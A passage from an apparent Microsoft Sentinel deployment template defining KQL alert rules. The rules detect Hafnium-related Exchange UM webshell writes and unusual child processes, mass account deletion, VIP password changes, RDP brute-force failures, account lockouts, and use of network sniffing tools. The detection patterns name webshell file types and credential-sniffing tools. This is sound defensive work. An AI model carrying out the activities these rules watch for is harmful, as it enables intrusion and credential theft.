          "query": "let EventIDList = dynamic(['4663']);     \nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet scriptExtensions = dynamic(['.php', '.jsp', '.js', '.aspx', '.asmx', '.asax', '.cfm', '.shtml']);\nunion isfuzzy=true\n(bv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Process has_any ('umworkerprocess.exe', 'UMService.exe')\n| where ObjectName has_any (scriptExtensions)\n| where AccessMask in ('0x2','0x100', '0x10', '0x4')\n| parse Computer with TargetHostName '.' TargetHostDomain\n| project TimeGenerated, Process, SourceUserName = SubjectUserName, SourceUserDomain=SubjectDomainName, SourceUser=SubjectAccount, FileName=ObjectName, TargetHostName, TargetDomainName\n),\n(DeviceFileEvents\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ActionType =~ 'FileCreated'\n| where InitiatingProcessFileName has_any ('umworkerprocess.exe', 'UMService.exe')\n| where FileName has_any(scriptExtensions)\n| extend Process = InitiatingProcessFileName\n| extend ParentProcess = InitiatingProcessParentFileName\n| extend SourceUserName = InitiatingProcessAccountName\n| extend SourceUser = InitiatingProcessAccountName\n| extend CommandLine = InitiatingProcessCommandLine\n| project Process, ParentProcess, FileName, TimeGenerated, SourceUser, TargetHostName=DeviceName, SourceUserName\n)\n|extend ExtendedDescription = strcat('Host system ', TargetHostName, ' executed potential Hafnium service executable ', Process, ' from parent process ', ParentProcess)\n|summarize arg_max(TimeGenerated, *) by ExtendedDescription\n, SourceUserName\n, SourceUserDomain\n, ParentProcess\n, Process\n, FileName\n, TargetHostName\n, TargetDomainName\n| extend VictimEntity = pack_array(SourceUserName, TargetHostName), bv_mapping_tag = SourceUserName\n| project TimeGenerated\n, ExtendedDescription\n, SourceUserName\n, SourceUserDomain\n, ParentProcess\n, Process\n, FileName\n, TargetHostName\n, TargetDomainName\n, VictimEntity\n, bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1543"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This query looks for the Exchange server UM process writing suspicious files that may be indicative of webshells.\n{{ExtendedDescription}}\ntag: SOC\nCategory: Windows Security\nMITRE: T1543"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SourceUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SourceUserDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "TargetHostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "TargetDomainName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-620')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-620')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-620: [SOC] Windows - HAFNIUM New UM Service Child Process",
          "description": "This query looks for new processes being spawned by the Exchange UM service where that process has not previously been observed before. MITRE: T1543 Category: Windows Security Events tag: Zero-Day tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);     \nlet start_time = 1h;\nlet end_time = now();\nlet start_time_historical = 7d;\nlet end_time_historical = 1h;\nlet latency = 1h;\nbv_parser_security_event\n| where TimeGenerated between (ago(start_time_historical) .. ago(end_time_historical)) \n| where EventID in (EventIDList)\n| where ParentProcessName has_any ('umworkerprocess.exe', 'UMService.exe')\n| join kind=rightanti (\n  bv_parser_security_event\n    | where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n    | where EventID in (EventIDList)\n    | where ParentProcessName has_any ('umworkerprocess.exe', 'UMService.exe')\n    )\n    on NewProcessName\n| where not(NewProcessName has_any('umworkerprocess.exe', 'UMService.exe'))\n| parse Computer with TargetHostName '.' TargetHostDomain\n|summarize arg_max(TimeGenerated, *) by Computer, TargetUserName, TargetDomainName, TargetAccount, TargetHostName, TargetHostDomain\n| extend VictimEntity = pack_array(TargetAccount, TargetHostName, TargetUserName)\n|extend ExtendedDescription = strcat('Workstation ', TargetHostName, ' executed process ', ParentProcessName, ' which is associated with Hafnium')\n| extend bv_mapping_tag = TargetUserName\n| project TimeGenerated, Computer, TargetUserName, TargetDomainName, NewProcessName, ParentProcessName, CommandLine, TargetAccount, TargetHostName, TargetHostDomain, VictimEntity, ExtendedDescription, bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1543"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This query looks for new processes being spawned by the Exchange UM service where that process has not previously been observed before.\n{{ExtendedDescription}}\ntag: SOC\nCategory: Windows Security\nMITRE: T1543"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "TargetDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "TargetHostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "TargetHostDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-614')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-614')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-614: [RBA] Windows - 10 Accounts Deleted in 10 Mins",
          "description": "When a user account deletes more than 10 users in 10 minutes.  Sourced from Windows Security Events MITRE: T1531 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4726']);       \nlet ingested_lookback = 10m; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nbv_parser_security_event \n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback)  \n| where EventID in (EventIDList)\n| where AccountType =~ 'User'\n| where SubjectUserName !in~(A614_EXCLUDE_ACCOUNT)\n| project TimeGenerated\n    , Activity\n    , HostCustomEntity = Computer\n    , Computer\n    , TargetUserName\n    , UserPrincipalName\n    , AccountCustomEntity = SubjectUserName\n|summarize CountAccountsDeleted = count()\n, DeletedUsers=make_set(TargetUserName)\n, minTimeGenerated=min(TimeGenerated)\n, maxTimeGenerated=max(TimeGenerated)\n, HostCustomEntity = make_set(HostCustomEntity)\nby  AccountCustomEntity, bin(TimeGenerated,generated_lookback)\n|extend HostCustomEntity = tostring(HostCustomEntity.[0])\n|where CountAccountsDeleted > 10\n| extend Description = strcat(tostring(CountAccountsDeleted), ' accounts were deleted by ', AccountCustomEntity, ' within a ', tostring(ingested_lookback), ' minute window. Actual time between ', tostring(minTimeGenerated), ' and ', tostring(maxTimeGenerated), '.')",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1531"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-602')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-602')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-602: [RBA] Windows - VIP Password change attempt",
          "description": "This alert notifies when an attempt was made the change a VIP account password MITRE: T1098 Category: Windows Security Events tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4724', '4723']);     \nbv_parser_security_event\n| where TimeGenerated > ago(1d)\n| where EventID in (EventIDList)\n| where tolower(TargetAccount) matches regex tolower(VIP_ACCOUNTS)\n| project TimeGenerated, HostCustomEntity = Computer, AdminAccount=Account, AccountCustomEntity = TargetAccount, Activity",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "DefenseEvasion",
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-177')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-177')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-177: [RBA] Windows - Excessive RDP Failures",
          "description": "This alert triggers when the same user generated 5 or more RDP login failures, which can be indicative of lateral movement activity. MITRE: T1110 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1d;\nlet latency = 0d;\nlet alert_bin = 1d;\nlet end_time = now();\nlet EventIDList = dynamic([4625]);\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet threshold = coalesce(toint(BV177_CONFIG['FAILED_THRESHOLD']), toint(global_config['FAILED_THRESHOLD']),1);       \nlet exclusions = array_concat(global_config['EXCLUSION'], BV177_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV177_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};    \nbv_parser_security_event\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where LogonType == 10\n| extend EventStatus = trim(@\"\\s\", coalesce(tolower(Status), tolower(SubStatus)))\n| lookup bvim_win_logonstatus on EventStatus\n| project \n    bv_user = TargetUserName\n    , bv_user_id = TargetUserSid\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_authentication_action = 'login'\n    , bv_authentication_protocol = 'rdp'\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_reason\n    , bv_authentication_reason\n    , bv_authentication_result = iff(isnotempty(bv_authentication_reason), 'failure', '')\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'bv_parser_security_event'\n| summarize bv_start_time = min(bv_start_time), bv_end_time = arg_max(bv_start_time, *), bv_event_count = count() by bv_user\n| where bv_event_count > threshold\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-177')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_user)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription          ",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-177: [RBA] Windows - Excessive RDP Failures",
            "alertDescriptionFormat": "This alert triggers when the same user generated 5 or more RDP login failures, which can be indicative of lateral movement activity. '\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1110"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-444')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-444')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-444: [Custom] Windows - Monitored Locked Accounts",
          "description": "This alert identifies accounts configured for monitoring that have been locked in the last 1 hour. This may indicate a potential brute force attack against the account. MITRE: T1531,T1110 Category: Windows Security Events tag: Custom",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic([4740, 4771]);    \nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;   \nlet SourceInformation = bv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time) .. end_time)\n| where EventID == EventIDList[1]\n| extend IpAddress = replace_string(IpAddress, '::ffff:', '')\n| summarize SrcIpAddr = take_anyif(IpAddress, IpAddress != '-')\n          , SrcWorkStation = take_anyif(WorkstationName, WorkstationName != '-') by UserName = tolower(TargetUserName);      \nbv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID == EventIDList[0]\n| where tolower(Account) matches regex tolower(A444_MONITORED_ACCOUNTS)\n| project TimeGenerated, Computer, Account,AccountSid = TargetSid, Domain = TargetDomainName, Activity, UserName = tolower(TargetUserName)\n| join kind=leftouter (SourceInformation) on UserName\n| summarize \n      bv_start_time=min(TimeGenerated)\n      , bv_end_time=max(TimeGenerated)\n      , bv_event_count=count()\n      , bv_dest_device = make_set(Computer, 5)\n      , bv_dest_device_cnt=dcount(Computer)\n      , bv_src_ip = make_set(SrcIpAddr, 5)\n      , bv_src_device = make_set(SrcWorkStation, 5) \n  by \n      bv_src_user = Account\n      , bin_at(TimeGenerated,alert_bin, end_time)\n| extend ExcludedIP = iff(array_length(set_intersect(bv_src_ip, A444_EXCLUDED_IPS)) > 0, true, false)\n| extend Class = case(ExcludedIP == false and bv_event_count > A444_THRESHOLD, 'Custom', 'RBA')\n| extend Tags = case(Class =~ 'RBA', 'tag: RBA', 'tag: Custom')\n| extend AlertName = strcat('BV-444: [', Class, '] Windows - Monitored Locked Accounts')      \n| parse bv_src_user with bv_src_user_domain @'\\' bv_src_user_name\n| extend RBAScore = iff(bv_event_count > 3 or bv_dest_device_cnt > 3, 3, 1)        \n| extend VictimEntity = array_concat(pack_array(bv_src_user_name), bv_dest_device)\n| extend ExtendedDescription = strcat(\n            'bv_src_user: ', bv_src_user\n            ,'\\nbv_event_count: ', bv_event_count\n            ,'\\nbv_dest_device: \\n*', strcat_array (bv_dest_device, '\\n* ')\n            ,iff(isnotempty(bv_src_ip), strcat('\\n\\nbv_src_ip: \\n* ', strcat_array (bv_src_ip, '\\n* ')), '')\n            ,iff(isnotempty(bv_src_device),strcat('\\n\\nbv_src_device: \\n* ', strcat_array (bv_src_device, '\\n* ')),'')\n        )\n| project \n  bv_start_time\n  , bv_end_time\n  , bv_event_count\n  , bv_src_user\n  , bv_src_ip\n  , bv_src_device\n  , bv_dest_device\n  , bv_dest_device_cnt\n  , RBAScore\n  , VictimEntity\n  , ExtendedDescription\n  , AlertName\n  , Class\n  , bv_src_user_name\n  , bv_src_user_domain\n  , Tags",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "CredentialAccess"
          ],
          "techniques": [
            "T1531",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "This alert identifies accounts configured for monitoring that have been locked in the last 1 hour. This may indicate a potential brute force attack against the account.\n\n{{ExtendedDescription}}\n\nCategory: Windows Security\nMITRE: T1531 MITRE: T1110\n{{Tags}}              "
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user_name"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "bv_src_user_domain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-234')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-234')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-234: [RBA] Windows - Network Sniffing Applications Detected",
          "description": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network.\n\nThis rule identifies usage of common processes associated with network sniffing applications.\n\nInclusion:\nExclusion: AccountName, Computer\n\nRecommendations:\n  1. Review additional activity on Host\n  2. Review additional activity for Account\n  3. Validate user is supposed to use network sniffing applications MITRE: T1040 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 1h; // earliest [ingest time] boundary\nlet generated_lookback = 3h; // earliest [log time] boundary\nlet historical_lookback = 1d; // earliest [log time] boundary\nlet start_time = 1h;\nlet latency = 2h;\nlet start_time_historical = 1d;\nlet end_time = now();\nlet alert_bin = 1h;\nlet EventIDList = dynamic(['4688']);\n//Get previously seen accounts for last 1 day for future suppresion\nlet PreviouslySeenAccounts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(start_time_historical) .. ago(alert_bin))\n| where AlertName has 'BV-234'\n| mv-expand parse_json(Entities)\n| extend AccountNames = iff(Entities.Type =~ 'account', Entities.Name, '')\n| summarize make_set_if(AccountNames, isnotempty(AccountNames)));\nbv_parser_security_event\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend Process = tolower(Process)\n| where Process in ('wireshark.exe','tcpdump.exe','dumpcap.exe','tshark.exe','windump.exe','wprui.exe','wpr.exe')\n//| extend ExcludedComputer = iff(tolower(Computer) matches regex tolower(A234_WHITELISTED_COMPUTERS), true, false)\n//Exclude if specifically excluded by customer or previously reported in the last 24 hours\n| extend ExcludedUser = iff(SubjectUserName in~ (PreviouslySeenAccounts), true, false) \n//| project TimeGenerated, Computer, Account, FirstEventTime, LastEventTime, ProcessCount, ProcessNames, ProcessFullPaths, SubjectUserName, HostName, HostDomain, SubjectDomainName\n// field normalization pre-exclusion\n| extend bv_user = tolower(SubjectUserName)\n  ,bv_process = Process\n  ,bv_process_command_line = CommandLine\n  ,bv_src_dvc = tolower(Computer)\n  ,bv_parent_process = ParentProcessName\n// exclusion using new method\n| mv-apply e = A234_EXCLUSIONS on (\n      extend keys = bag_keys(e) \n      | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n      | extend bv_src_dvc_excluded = iff(bv_src_dvc contains e.bv_src_dvc and isnotempty(e.bv_src_dvc), 1, 0)\n      | extend bv_user_excluded = iff(bv_user contains e.bv_user and isnotempty(e.bv_user), 1,0)\n      | extend bv_process_excluded = iff(bv_process contains e.bv_process and isnotempty(e.bv_process), 1,0)\n      | extend excluded_count = \n          bv_src_dvc_excluded\n          + bv_user_excluded\n          + bv_process_excluded\n      | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true)  \n      | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n      | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n      | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n  )\n  | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n  | where transparent != 0\n| extend Class = 'RBA'\n| summarize FirstEventTime=min(TimeGenerated), LastEventTime=max(TimeGenerated), ProcessCount=dcount(Process), ProcessFullPaths=make_set(NewProcessName,5) by bv_user, bv_src_dvc, Class,  bv_process, bin_at(TimeGenerated, alert_bin, now())\n| extend HostName = extract(@'(.+)\\.\\w+$', 1, bv_src_dvc)\n| extend HostDomain = extract(@'.(\\w+)$', 1, bv_src_dvc)\n| extend ExtendedDescription = strcat(\n  'bv_user: ', bv_user, '\\n'\n  ,'TimeGenerated: ', TimeGenerated, '\\n'\n  ,'bv_src_dvc: ', bv_src_dvc, '\\n'\n  ,'bv_process: ', bv_process, '\\n'\n  ,'bv_user: ', bv_user, '\\n'\n)\n| extend AttackerEntity=pack_array(bv_user, bv_src_dvc)\n| extend VictimEntity=pack_array(bv_user, bv_src_dvc)\n|extend Class = 'RBA'\n//hardcoding class to RBA, keeping incident set to allow for easy auto delegate\n| extend Tags = iff(Class == 'SOC', 'tag: SOC', 'tag: RBA')\n        , RBAScore = iff(Class == 'SOC', 0, 3) \n| project TimeGenerated\n, bv_src_dvc\n, bv_user\n, bv_start_time = FirstEventTime\n, bv_end_time = LastEventTime\n, ProcessCount\n, bv_process\n, ProcessFullPaths\n, Tags\n, Class\n, AttackerEntity\n, VictimEntity\n, ExtendedDescription\n, RBAScore",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Discovery"
          ],
          "techniques": [
            "T1040"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
